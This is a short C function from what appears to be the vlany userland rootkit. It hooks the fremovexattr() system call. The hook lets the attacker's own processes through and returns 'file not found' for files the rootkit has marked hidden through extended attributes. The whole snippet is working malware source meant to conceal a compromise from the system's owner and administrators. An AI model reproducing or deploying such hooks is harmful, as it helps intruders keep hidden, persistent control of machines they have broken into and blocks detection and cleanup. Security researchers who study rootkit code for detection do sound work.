int fremovexattr(int fd, const char *name)
{
    #ifdef DEBUG
        printf("[vlany] fremovexattr() called\n");
    #endif

    HOOK(old_fremovexattr, CFREMOVEXATTR);

    if(owned()) return old_fremovexattr(fd, name);
    
    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fremovexattr(fd, name);
}
